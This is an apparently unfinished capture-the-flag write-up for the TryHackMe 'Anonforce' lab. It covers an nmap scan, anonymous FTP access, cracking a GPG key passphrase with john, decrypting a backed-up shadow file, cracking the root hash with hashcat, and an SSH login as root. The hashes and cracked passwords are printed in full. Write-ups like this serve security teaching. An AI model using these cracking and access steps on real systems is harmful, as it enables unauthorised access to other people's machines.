# Anonforce

Nmap port scan
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-12 00:19 UTC
Nmap scan report for 10.10.139.53
Host is up (0.085s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 95.31 seconds
```

# user.txt

Ftp has anonymous auth enabled.
We can read the *user.txt* file from the home directory of the only user


# root.txt

We find a *notoread* folder. In it there is a *backup.pgp* file and a *private.asc* file.

The first one is encrypted using the key in the second one. The second one is also encrypted and the password can be found using *johntheripper*.

When prompted to input a password, we give it the one that *john* gave us (xbox360).

We get the sha512crypt (hashcat 1800) hash of the password for root, which we can crack with hashcat. The password is *hikari*.

With this password it seems like we can log in with the user root through *ssh* and get *root.txt*.

```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ gpg2john private.asc > 4john
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ john 4john --show
anonforce:xbox360:::anonforce <melodias@anonforce.nsa>::private.asc

1 password hash cracked, 0 left


kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ gpg -d backup.pgp


kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ gpg -d backup.pgp > backup
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ cat backup
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::


kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ hashcat --force -m 1800 -a 0 root.hash /usr/share/wordlists/rockyou.txt

kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Anonforce_IN_PROGRESS$ ssh root@$IP

```